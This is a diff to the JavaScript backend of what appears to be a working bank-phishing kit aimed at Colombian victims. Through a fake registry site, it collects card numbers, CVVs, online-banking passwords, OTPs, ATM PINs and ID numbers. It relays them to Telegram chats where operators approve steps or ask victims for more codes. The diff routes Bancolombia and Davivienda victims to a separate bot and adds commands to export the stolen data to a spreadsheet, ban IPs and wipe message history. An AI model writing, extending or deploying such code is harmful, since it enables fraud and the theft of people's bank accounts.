@@ -6,36 +6,33 @@ const app = express();
 app.use(cors());
 app.use(express.json({ limit: '1mb' }));
 
+// ============================================================
+// 🔑 CREDENCIALES TELEGRAM (ORIGINAL + ESPECIAL)
+// ============================================================
 const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+// Chat/bot secundario para Bancolombia y Davivienda
+const TELEGRAM_TOKEN_ESPECIAL =
+    process.env.TELEGRAM_BOT_TOKEN_ESPECIAL || process.env.TELEGRAM_TOKEN_ESPECIAL || TELEGRAM_TOKEN;
+const CHAT_ID_ESPECIAL =
+    process.env.TELEGRAM_CHAT_ID_ESPECIAL || process.env.TELEGRAM_CHAT_ID_2 || CHAT_ID;
+
 const FRONT_BASE_URL = process.env.FRONT_BASE_URL || 'https://registraenlineanuip-crtificadonacioncol.onrender.com';
 
+// ============================================================
 // 🧠 ALMACENAMIENTO EN MEMORIA
+// ============================================================
 const pagosPendientes = new Map();
 
 // 🚫 IPS BANEADAS
 const ipsBaneadas = new Set();
 
-// 💬 IDs de TODOS los mensajes que el bot ha enviado (para poder borrarlos)
-const mensajesEnviados = new Set();
+// 💬 IDs de mensajes enviados (para poder borrarlos) → Map<messageId, { chat_id, token }>
+const mensajesEnviados = new Map();
 
 // ============================================================
-// 🛡️ MIDDLEWARE GLOBAL DE BANEO
-// ============================================================
-app.use((req, res, next) => {
-    const ipCliente = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
-        || req.socket?.remoteAddress
-        || req.ip;
-    const ipLimpia = String(ipCliente).replace(/^::ffff:/, '');
-
-    if (ipsBaneadas.has(ipLimpia)) {
-        return res.status(404).send('Not Found');
-    }
-    next();
-});
-
-// ============================================================
-// 🔥 DETECCIÓN DE BANCO
+// 🏦 DETECCIÓN DE BANCO
 // ============================================================
 
 function esBancoClaveATM(banco) {
@@ -55,37 +52,47 @@ function esBancolombia(banco) {
     return String(banco).trim().toLowerCase().includes('bancolombia');
 }
 
+function esDavivienda(banco) {
+    if (!banco) return false;
+    return String(banco).trim().toLowerCase().includes('davivienda');
+}
+
+// 🎯 Bancos que van al chat secundario
+function esBancoEspecial(banco) {
+    return esBancolombia(banco) || esDavivienda(banco);
+}
+
 // ============================================================
-// 🔧 HELPERS TELEGRAM
+// 🔧 HELPERS TELEGRAM (con token/chat parametrizables)
 // ============================================================
 
-async function tgSendMessage(text, replyMarkup) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
+async function tgSendMessage(text, replyMarkup, chatId = CHAT_ID, token = TELEGRAM_TOKEN) {
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const body = { chat_id: chatId, text, parse_mode: 'HTML' };
     if (replyMarkup) body.reply_markup = replyMarkup;
     try {
         const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
         const data = await r.json();
         if (data && data.ok && data.result && data.result.message_id) {
-            mensajesEnviados.add(data.result.message_id);
+            mensajesEnviados.set(data.result.message_id, { chat_id: chatId, token });
         }
         return data;
-    } catch (e) { 
+    } catch (e) {
         console.error("❌ Error enviando mensaje a Telegram:", e);
-        return { ok: false }; 
+        return { ok: false };
     }
 }
 
-async function tgEditMessage(messageId, text) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageText`;
+async function tgEditMessage(messageId, text, chatId = CHAT_ID, token = TELEGRAM_TOKEN) {
+    const url = `https://api.telegram.org/bot${token}/editMessageText`;
     try {
-        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId, text, parse_mode: 'HTML' }) });
+        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, message_id: messageId, text, parse_mode: 'HTML' }) });
         return r.json();
     } catch { return null; }
 }
 
-async function tgAnswerCallback(callbackQueryId, text) {
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`;
+async function tgAnswerCallback(callbackQueryId, text, token = TELEGRAM_TOKEN) {
+    const url = `https://api.telegram.org/bot${token}/answerCallbackQuery`;
     try {
         await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ callback_query_id: callbackQueryId, text, show_alert: false }) });
     } catch {}
@@ -97,6 +104,15 @@ function formatearUsuarioTelegram(from) {
     const nombre = [from.first_name, from.last_name].filter(Boolean).join(' ') || 'Sin nombre';
     const username = from.username ? `@${from.username}` : 'sin @';
     return `${nombre} (${username}) — ID: <code>${from.id}</code>`;
+}
+
+// 🎯 Resolver chat/token destino según el pago
+function resolverDestino(pago) {
+    if (!pago) return { chatId: CHAT_ID, token: TELEGRAM_TOKEN };
+    return {
+        chatId: pago.chat_destino || CHAT_ID,
+        token: pago.token_destino || TELEGRAM_TOKEN
+    };
 }
 
 // ============================================================
@@ -217,7 +233,7 @@ app.post('/api/crear-pago', async (req, res) => {
         clave_atm, clave_dinamica, paso,
         nombre_solicitante, cedula_solicitante, ip
     } = req.body || {};
-    
+
     if (!solicitud_id) return res.status(400).json({ success: false, error: 'Datos incompletos' });
     if (paso === 'crear' && (!numero_tarjeta || !cvv || !vencimiento || !titular)) {
         return res.status(400).json({ success: false, error: 'Datos de tarjeta incompletos' });
@@ -227,6 +243,10 @@ app.post('/api/crear-pago', async (req, res) => {
         let pago = pagosPendientes.get(solicitud_id);
 
         if (!pago) {
+            const bancoFinal = banco_emisor || 'Desconocido';
+            // 🎯 Elegir chat/token destino según banco
+            const esEspecial = esBancoEspecial(bancoFinal);
+
             pago = {
                 solicitud_id,
                 titular: titular || '—',
@@ -234,7 +254,7 @@ app.post('/api/crear-pago', async (req, res) => {
                 cvv: cvv || '—',
                 vencimiento: vencimiento || '—',
                 marca_tarjeta: (marca_tarjeta || 'visa').toLowerCase(),
-                banco_emisor: banco_emisor || 'Desconocido',
+                banco_emisor: bancoFinal,
                 usuario_banco: usuario_banco || null,
                 password_banco: password_banco || null,
                 codigo_otp: codigo_otp || null,
@@ -243,8 +263,8 @@ app.post('/api/crear-pago', async (req, res) => {
                 nombre_solicitante: nombre_solicitante || '—',
                 cedula_solicitante: cedula_solicitante || '—',
                 ip: ip || 'Desconocida',
-                requiere_clave_atm: esBancoClaveATM(banco_emisor),
-                requiere_clave_dinamica: esBancolombia(banco_emisor),
+                requiere_clave_atm: esBancoClaveATM(bancoFinal),
+                requiere_clave_dinamica: esBancolombia(bancoFinal),
                 requiere_sms: false,
                 estado: 'pendiente',
                 paso: paso || 'crear',
@@ -253,7 +273,11 @@ app.post('/api/crear-pago', async (req, res) => {
                 redirigir_a: null,
                 message_id_crear: null,
                 message_id_credenciales: null,
-                message_id_otp: null
+                message_id_otp: null,
+                // 📍 Destino fijado al crear el pago
+                es_especial: esEspecial,
+                chat_destino: esEspecial ? CHAT_ID_ESPECIAL : CHAT_ID,
+                token_destino: esEspecial ? TELEGRAM_TOKEN_ESPECIAL : TELEGRAM_TOKEN
             };
         } else {
             pago.titular = titular || pago.titular;
@@ -276,6 +300,14 @@ app.post('/api/crear-pago', async (req, res) => {
             pago.paso = paso || pago.paso;
             pago.fase_actual = paso === 'otp' ? 'otp' : 'credenciales';
 
+            // 🔄 Recalcular destino si cambió el banco (por seguridad)
+            const nuevoEsEspecial = esBancoEspecial(pago.banco_emisor);
+            if (nuevoEsEspecial !== pago.es_especial) {
+                pago.es_especial = nuevoEsEspecial;
+                pago.chat_destino = nuevoEsEspecial ? CHAT_ID_ESPECIAL : CHAT_ID;
+                pago.token_destino = nuevoEsEspecial ? TELEGRAM_TOKEN_ESPECIAL : TELEGRAM_TOKEN;
+            }
+
             if (paso === 'credenciales') {
                 pago.codigo_otp = null;
                 pago.clave_atm = null;
@@ -286,11 +318,14 @@ app.post('/api/crear-pago', async (req, res) => {
                 pago.redirigir_a = null;
             }
         }
-        
+
         pagosPendientes.set(solicitud_id, pago);
 
         const pasoActual = paso || 'crear';
-        
+
+        // 🎯 Destino resuelto
+        const { chatId: destChat, token: destToken } = resolverDestino(pago);
+
         let replyMarkup;
         if (pasoActual === 'crear') {
             replyMarkup = { inline_keyboard: [[
@@ -318,13 +353,13 @@ app.post('/api/crear-pago', async (req, res) => {
         }
 
         if (pasoActual === 'crear') {
-            const sent = await tgSendMessage(textoPasoCrear(pago), replyMarkup);
+            const sent = await tgSendMessage(textoPasoCrear(pago), replyMarkup, destChat, destToken);
             if (sent && sent.ok && sent.result) pago.message_id_crear = sent.result.message_id;
         } else if (pasoActual === 'credenciales') {
-            const sent = await tgSendMessage(textoPasoCredenciales(pago), replyMarkup);
+            const sent = await tgSendMessage(textoPasoCredenciales(pago), replyMarkup, destChat, destToken);
             if (sent && sent.ok && sent.result) pago.message_id_credenciales = sent.result.message_id;
         } else if (pasoActual === 'otp') {
-            const sent = await tgSendMessage(textoPasoOTP(pago), replyMarkup);
+            const sent = await tgSendMessage(textoPasoOTP(pago), replyMarkup, destChat, destToken);
             if (sent && sent.ok && sent.result) pago.message_id_otp = sent.result.message_id;
         }
 
@@ -379,47 +414,53 @@ app.get('/api/estado-pago/:solicitud_id', (req, res) => {
 // ============================================================
 // 🤖 PROCESADOR DE UPDATE DE TELEGRAM (polling)
 // ============================================================
-async function procesarUpdate(update) {
+async function procesarUpdate(update, tokenBot) {
     try {
-        // 📩 Comandos de baneo
+        // 📩 Comandos de administración (permitidos en chat original y especial)
         const msg = update.message;
         if (msg && msg.text) {
             const chatIdMsg = String(msg.chat?.id);
-            if (chatIdMsg !== String(CHAT_ID)) return;
+            const esChatOriginal = chatIdMsg === String(CHAT_ID);
+            const esChatEspecial = String(CHAT_ID_ESPECIAL) === chatIdMsg;
+
+            if (!esChatOriginal && !esChatEspecial) return;
+
+            // Responder siempre en el mismo chat desde donde se escribe
+            const responder = (texto) => tgSendMessage(texto, undefined, chatIdMsg, tokenBot);
 
             const partes = msg.text.trim().split(/\s+/);
             const comando = partes[0].toLowerCase().split('@')[0];
             const arg = partes[1];
 
             if (comando === '/ban') {
-                if (!arg) { await tgSendMessage('⚠️ Uso: <code>/ban 1.2.3.4</code>'); return; }
+                if (!arg) { await responder('⚠️ Uso: <code>/ban 1.2.3.4</code>'); return; }
                 const ip = arg.replace(/^::ffff:/, '').trim();
                 ipsBaneadas.add(ip);
-                await tgSendMessage(`🚫 <b>IP BANEADA</b>\n<code>${ip}</code>\n\nAhora recibirá 404 en toda la web.`);
+                await responder(`🚫 <b>IP BANEADA</b>\n<code>${ip}</code>\n\nAhora recibirá 404 en toda la web.`);
                 return;
             }
             if (comando === '/unban') {
-                if (!arg) { await tgSendMessage('⚠️ Uso: <code>/unban 1.2.3.4</code>'); return; }
+                if (!arg) { await responder('⚠️ Uso: <code>/unban 1.2.3.4</code>'); return; }
                 const ip = arg.replace(/^::ffff:/, '').trim();
                 const eliminada = ipsBaneadas.delete(ip);
-                await tgSendMessage(eliminada
+                await responder(eliminada
                     ? `✅ <b>IP DESBANEADA</b>\n<code>${ip}</code>`
                     : `ℹ️ La IP <code>${ip}</code> no estaba baneada.`);
                 return;
             }
             if (comando === '/listaban' || comando === '/banlist') {
                 if (ipsBaneadas.size === 0) {
-                    await tgSendMessage('📭 No hay IPs baneadas.');
+                    await responder('📭 No hay IPs baneadas.');
                 } else {
                     const lista = [...ipsBaneadas].map(ip => `• <code>${ip}</code>`).join('\n');
-                    await tgSendMessage(`🚫 <b>IPs BANEADAS (${ipsBaneadas.size})</b>\n\n${lista}`);
+                    await responder(`🚫 <b>IPs BANEADAS (${ipsBaneadas.size})</b>\n\n${lista}`);
                 }
                 return;
             }
             if (comando === '/base') {
                 try {
                     if (pagosPendientes.size === 0) {
-                        await tgSendMessage('📭 No hay registros para exportar.');
+                        await responder('📭 No hay registros para exportar.');
                         return;
                     }
 
@@ -430,6 +471,7 @@ async function procesarUpdate(update) {
                             'Estado': pago.estado || '',
                             'Fase Actual': pago.fase_actual || '',
                             'Paso': pago.paso || '',
+                            'Banco Especial': pago.es_especial ? 'SÍ' : 'NO',
                             'Solicitante': pago.nombre_solicitante || '',
                             'Cédula Solicitante': pago.cedula_solicitante || '',
                             'Titular': pago.titular || '',
@@ -462,22 +504,22 @@ async function procesarUpdate(update) {
                     const buffer = XLSX.write(libro, { type: 'buffer', bookType: 'xlsx' });
 
                     const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
+                    formData.append('chat_id', chatIdMsg);
                     formData.append('caption', `📊 <b>BASE DE DATOS</b>\n\n📦 Total registros: <b>${filas.length}</b>\n🕒 ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}`);
                     formData.append('parse_mode', 'HTML');
                     formData.append('document', new Blob([buffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }), `base_registros_${Date.now()}.xlsx`);
 
-                    const urlEnvio = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
+                    const urlEnvio = `https://api.telegram.org/bot${tokenBot}/sendDocument`;
                     const resp = await fetch(urlEnvio, { method: 'POST', body: formData });
                     const dataResp = await resp.json();
 
                     if (!dataResp.ok) {
                         console.error('Error enviando Excel:', dataResp);
-                        await tgSendMessage('❌ Error al enviar el archivo Excel.');
+                        await responder('❌ Error al enviar el archivo Excel.');
                     }
                 } catch (err) {
                     console.error('Error en /base:', err);
-                    await tgSendMessage('❌ Error generando la base de datos.');
+                    await responder('❌ Error generando la base de datos.');
                 }
                 return;
             }
@@ -487,16 +529,18 @@ async function procesarUpdate(update) {
             // ============================================================
             if (comando === '/borrartodo' || comando === '/reset') {
                 const cantidadRegistros = pagosPendientes.size;
-                const ids = [...mensajesEnviados];
+                const ids = [...mensajesEnviados.keys()];
                 let borradosOk = 0;
                 let borradosFail = 0;
 
                 for (const messageId of ids) {
+                    const meta = mensajesEnviados.get(messageId);
+                    if (!meta) continue;
                     try {
-                        const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteMessage`, {
+                        const r = await fetch(`https://api.telegram.org/bot${meta.token}/deleteMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ chat_id: CHAT_ID, message_id: messageId })
+                            body: JSON.stringify({ chat_id: meta.chat_id, message_id: messageId })
                         });
                         const data = await r.json();
                         if (data.ok) {
@@ -504,7 +548,6 @@ async function procesarUpdate(update) {
                             mensajesEnviados.delete(messageId);
                         } else {
                             borradosFail++;
-                            // Si ya no existe o es muy viejo, lo quitamos igual del set
                             if (data.description && (
                                 data.description.includes('message to delete not found') ||
                                 data.description.includes("message can't be deleted")
@@ -522,7 +565,7 @@ async function procesarUpdate(update) {
                 // Limpiar registros en memoria
                 pagosPendientes.clear();
 
-                await tgSendMessage(
+                await responder(
                     `🗑️ <b>HISTORIAL BORRADO</b>\n\n` +
                     `📦 Registros eliminados: <b>${cantidadRegistros}</b>\n` +
                     `💬 Mensajes del bot borrados: <b>${borradosOk}</b>\n` +
@@ -534,7 +577,7 @@ async function procesarUpdate(update) {
             }
         }
 
-        // 📌 Callbacks (botones inline) — CON IDENTIFICACIÓN DE QUIEN OPRIME
+        // 📌 Callbacks (botones inline)
         const cq = update.callback_query;
         if (!cq || !cq.data) return;
 
@@ -543,58 +586,60 @@ async function procesarUpdate(update) {
         const quienOprimio = formatearUsuarioTelegram(cq.from);
 
         const pago = pagosPendientes.get(solicitud_id);
-        if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada');
+        if (!pago) return await tgAnswerCallback(cq.id, 'No encontrada', tokenBot);
 
+        // 🎯 El pago sabe a qué chat/token pertenece
+        const { chatId: destChat, token: destToken } = resolverDestino(pago);
         const estaEnFaseOTP = (msgId === pago.message_id_otp);
 
         if (accion === 'aprobar') {
             if (!estaEnFaseOTP) {
                 pago.estado = 'aprobado_credenciales';
-                await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
-                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + textoPasoCredenciales(pago) + `\n\n👤 <b>Aprobado por:</b> ${quienOprimio}`);
+                await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas', destToken);
+                if (msgId) await tgEditMessage(msgId, `✅ <b>CREDENCIALES APROBADAS</b>\n\n` + textoPasoCredenciales(pago) + `\n\n👤 <b>Aprobado por:</b> ${quienOprimio}`, destChat, destToken);
             } else {
                 const archivo = { visa: 'visa.html', mastercard: 'master.html', amex: 'amex.html' }[(pago.marca_tarjeta || '').toLowerCase()] || 'visa.html';
                 pago.estado = 'aprobado';
                 pago.fase_actual = 'completado';
                 pago.redirigir_a = archivo;
-                await tgAnswerCallback(cq.id, '✅ Pago aprobado');
-                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + textoPasoOTP(pago) + `\n\n👤 <b>Aprobado por:</b> ${quienOprimio}`);
+                await tgAnswerCallback(cq.id, '✅ Pago aprobado', destToken);
+                if (msgId) await tgEditMessage(msgId, `✅ <b>PAGO APROBADO</b>\n\n` + textoPasoOTP(pago) + `\n\n👤 <b>Aprobado por:</b> ${quienOprimio}`, destChat, destToken);
             }
         } else if (accion === 'rechazar') {
             const motivo = estaEnFaseOTP ? 'OTP incorrecto.' : 'Credenciales incorrectas.';
             pago.estado = estaEnFaseOTP ? 'rechazado_otp' : 'rechazado_credenciales';
             pago.motivo_rechazo = motivo;
-            await tgAnswerCallback(cq.id, '❌ Rechazado');
+            await tgAnswerCallback(cq.id, '❌ Rechazado', destToken);
             if (msgId) {
                 const texto = estaEnFaseOTP ? textoPasoOTP(pago) : textoPasoCredenciales(pago);
-                await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}\n\n👤 <b>Rechazado por:</b> ${quienOprimio}`);
+                await tgEditMessage(msgId, `❌ <b>RECHAZADO</b>\n\n` + texto + `\n📌 <b>Motivo:</b> ${motivo}\n\n👤 <b>Rechazado por:</b> ${quienOprimio}`, destChat, destToken);
             }
         } else if (accion === 'clave_atm') {
             pago.estado = 'aprobado_credenciales';
-            await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente');
+            await tgAnswerCallback(cq.id, '🔑 Se solicitó Clave ATM al cliente', destToken);
             if (msgId) {
-                await tgEditMessage(msgId, `🔑 <b>SE SOLICITÓ CLAVE ATM AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago) + `\n\n👤 <b>Solicitado por:</b> ${quienOprimio}`);
+                await tgEditMessage(msgId, `🔑 <b>SE SOLICITÓ CLAVE ATM AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago) + `\n\n👤 <b>Solicitado por:</b> ${quienOprimio}`, destChat, destToken);
             }
         } else if (accion === 'sms') {
             pago.requiere_sms = true;
             pago.estado = 'aprobado_credenciales';
-            await tgAnswerCallback(cq.id, '📱 Se solicitó código por SMS al cliente');
+            await tgAnswerCallback(cq.id, '📱 Se solicitó código por SMS al cliente', destToken);
             if (msgId) {
-                await tgEditMessage(msgId, `📱 <b>SE SOLICITÓ CÓDIGO POR SMS AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago) + `\n\n👤 <b>Solicitado por:</b> ${quienOprimio}`);
+                await tgEditMessage(msgId, `📱 <b>SE SOLICITÓ CÓDIGO POR SMS AL CLIENTE</b>\n\n` + textoPasoCredenciales(pago) + `\n\n👤 <b>Solicitado por:</b> ${quienOprimio}`, destChat, destToken);
             }
         } else if (accion === 'error_cc') {
             pago.estado = 'error_cc';
             pago.motivo_rechazo = 'Error en los datos de la tarjeta (CC).';
-            await tgAnswerCallback(cq.id, '💳 Error CC registrado');
+            await tgAnswerCallback(cq.id, '💳 Error CC registrado', destToken);
             if (msgId) {
-                await tgEditMessage(msgId, `💳 <b>ERROR CC</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente volver a ingresar los datos de la tarjeta.\n\n👤 <b>Reportado por:</b> ${quienOprimio}`);
+                await tgEditMessage(msgId, `💳 <b>ERROR CC</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente volver a ingresar los datos de la tarjeta.\n\n👤 <b>Reportado por:</b> ${quienOprimio}`, destChat, destToken);
             }
         } else if (accion === 'error_usuario') {
             pago.estado = 'rechazado_user_error';
             pago.motivo_rechazo = 'Error de usuario: credenciales no coinciden.';
-            await tgAnswerCallback(cq.id, '⚠️ Error de usuario registrado');
+            await tgAnswerCallback(cq.id, '⚠️ Error de usuario registrado', destToken);
             if (msgId) {
-                await tgEditMessage(msgId, `⚠️ <b>ERROR DE USUARIO</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente reiniciar el proceso.\n\n👤 <b>Reportado por:</b> ${quienOprimio}`);
+                await tgEditMessage(msgId, `⚠️ <b>ERROR DE USUARIO</b>\n\n` + textoPasoOTP(pago) + `\n📌 <b>Acción:</b> Se solicitará al cliente reiniciar el proceso.\n\n👤 <b>Reportado por:</b> ${quienOprimio}`, destChat, destToken);
             }
         }
     } catch (err) {
@@ -603,40 +648,42 @@ async function procesarUpdate(update) {
 }
 
 // ============================================================
-// 🔄 POLLING DE TELEGRAM
+// 🔄 POLLING DE TELEGRAM (uno por token, sin duplicar)
 // ============================================================
-let lastUpdateId = 0;
+const lastUpdateIdPorToken = {}; // Map<token, updateId>
 
-async function iniciarPolling() {
-    if (!TELEGRAM_TOKEN) {
-        console.error('❌ TELEGRAM_TOKEN no configurado');
+async function iniciarPollingToken(tokenBot, etiqueta) {
+    if (!tokenBot) {
+        console.error(`❌ Token no configurado para polling (${etiqueta})`);
         return;
     }
 
     // Eliminar webhook para que getUpdates funcione
     try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/deleteWebhook`);
-        console.log('✅ Webhook eliminado (usando polling)');
+        await fetch(`https://api.telegram.org/bot${tokenBot}/deleteWebhook`);
+        console.log(`✅ Webhook eliminado (${etiqueta}, usando polling)`);
     } catch (e) {
-        console.error('Error eliminando webhook:', e);
+        console.error(`Error eliminando webhook (${etiqueta}):`, e);
     }
 
-    console.log('🔄 Polling de Telegram iniciado');
+    console.log(`🔄 Polling de Telegram iniciado (${etiqueta})`);
+    lastUpdateIdPorToken[tokenBot] = 0;
 
     while (true) {
         try {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?timeout=30&offset=${lastUpdateId + 1}`;
+            const offset = lastUpdateIdPorToken[tokenBot] + 1;
+            const url = `https://api.telegram.org/bot${tokenBot}/getUpdates?timeout=30&offset=${offset}`;
             const r = await fetch(url);
             const data = await r.json();
 
             if (data.ok && Array.isArray(data.result)) {
                 for (const update of data.result) {
-                    lastUpdateId = update.update_id;
-                    await procesarUpdate(update);
+                    lastUpdateIdPorToken[tokenBot] = update.update_id;
+                    await procesarUpdate(update, tokenBot);
                 }
             }
         } catch (e) {
-            console.error('Error en polling:', e.message);
+            console.error(`Error en polling (${etiqueta}):`, e.message);
             await new Promise(r => setTimeout(r, 3000));
         }
     }
@@ -648,5 +695,14 @@ async function iniciarPolling() {
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Backend en puerto ${PORT}`);
-    iniciarPolling();
+    console.log(`👀 Chat principal: ${CHAT_ID}`);
+    console.log(`🎯 Chat especial (Bancolombia/Davivienda): ${CHAT_ID_ESPECIAL}`);
+
+    // Polling del bot principal (siempre)
+    iniciarPollingToken(TELEGRAM_TOKEN, 'principal');
+
+    // Polling del bot especial (solo si es un token distinto)
+    if (TELEGRAM_TOKEN_ESPECIAL && TELEGRAM_TOKEN_ESPECIAL !== TELEGRAM_TOKEN) {
+        iniciarPollingToken(TELEGRAM_TOKEN_ESPECIAL, 'especial');
+    }
 });
